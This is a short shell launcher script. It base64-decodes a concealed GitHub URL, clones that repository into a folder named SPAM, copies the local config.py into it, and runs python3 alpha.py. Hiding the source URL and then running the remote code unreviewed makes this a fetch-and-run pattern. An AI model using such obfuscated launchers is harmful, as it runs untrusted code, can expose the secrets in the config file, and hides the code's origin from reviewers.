_yashu () {
    echo "aHR0cHM6Ly9naXRodWIuY29tL1NwbFJlcG8vc3N1Yg==" | base64 -d
}

_alpha () {
    if [ -d "SPAM" ]; then  
        rm -r SPAM
    fi
    git clone $(_yashu) SPAM 
    echo "Configuring Environment..."
    rm SPAM/config.py
    cp config.py SPAM/config.py
    cd SPAM
    echo "Inititalizing..."
    python3 alpha.py
}

_alpha
